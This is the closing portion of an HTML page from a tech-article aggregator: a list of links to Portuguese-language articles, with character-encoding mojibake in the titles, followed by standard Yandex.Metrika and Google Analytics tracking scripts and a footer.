<li><a href="../pt416139/index.html">Autentica√ß√£o forte como parte da estrat√©gia GDPR</a></li>
<li><a href="../pt416147/index.html">Organiza√ß√£o da navega√ß√£o em aplicativos iOS usando o Controlador Raiz</a></li>
<li><a href="../pt416149/index.html">Perguntas e respostas sobre energia renov√°vel, parte 1</a></li>
<li><a href="../pt416151/index.html">Bal√£o sem dimens√£o. An√°lise utilit√°ria de dimens√£o m√°gica</a></li>
<li><a href="../pt416153/index.html">Os avi√µes se tornar√£o mais confi√°veis? Fabricantes de aeronaves apresentam rob√¥s √†s empresas</a></li>
<li><a href="../pt416155/index.html">WebSockets em Angular: crie um Servi√ßo Angular para trabalhar com soquetes da Web</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>